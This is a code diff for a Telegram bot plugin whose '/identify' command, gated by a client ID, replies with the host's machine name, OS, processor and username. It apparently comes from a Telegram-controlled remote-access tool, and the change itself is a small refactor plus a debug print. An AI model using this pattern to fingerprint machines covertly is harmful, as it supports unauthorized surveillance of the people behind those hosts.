@@ -1,9 +1,12 @@
 from telegram.ext import CommandHandler
 
+from telegram import Bot
+
 passedCtx = None
 
 def run(ctx):
-    global passedCtx  # <-- this was missing!
+    global passedCtx
+    print(f"[identify module] ctx keys: {list(ctx.keys())}")  # see what's available
     passedCtx = ctx
     ctx["app"].add_handler(CommandHandler("identify", identify))
 
@@ -19,13 +22,6 @@ async def identify(update, context):
     if context.args[0] != passedCtx["info"].ReturnClientID():
         print("Not the same client ID")
         return
-
     IDENTIFIERS = passedCtx["info"].GetUniqueIdentifiers()
-    response = (
-        f"Current identifiers:\n"
-        f"Machine Name: {IDENTIFIERS['MachineName']}\n"
-        f"OS: {IDENTIFIERS['OS']} {IDENTIFIERS['OSVersion']} ({IDENTIFIERS['Architecture']})\n"
-        f"Processor: {IDENTIFIERS['Processor']}\n"
-        f"Username: {IDENTIFIERS['Username']}"
-    )
+    response = f"Current identifiers:\nMachine Name: {IDENTIFIERS['MachineName']}\nOS: {IDENTIFIERS['OS']} {IDENTIFIERS['OSVersion']} ({IDENTIFIERS['Architecture']})\nProcessor: {IDENTIFIERS['Processor']}\nUsername: {IDENTIFIERS['Username']}"
     await update.message.reply_text(response)
